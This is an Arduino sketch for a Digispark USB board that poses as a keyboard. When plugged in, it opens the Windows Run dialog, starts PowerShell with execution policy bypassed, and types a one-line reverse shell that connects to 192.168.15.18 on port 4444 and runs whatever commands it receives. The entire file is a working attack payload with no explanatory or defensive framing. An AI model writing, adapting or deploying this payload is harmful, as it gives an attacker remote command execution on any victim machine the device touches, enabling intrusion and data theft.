#include "DigiKeyboardPtBr.h"
#include "DigiKeyBoard.h"
void setup() {
}

char mode[] = "powershell -nop -exec bypass";

void loop() {
  //
  DigiKeyboardPtBr.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboardPtBr.delay(1000);
  DigiKeyboardPtBr.println(mode);
  DigiKeyboardPtBr.delay(5000);
  DigiKeyboardPtBr.println("$sm=(New-Object Net.Sockets.TCPClient(\"192.168.15.18\",4444)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}");

}
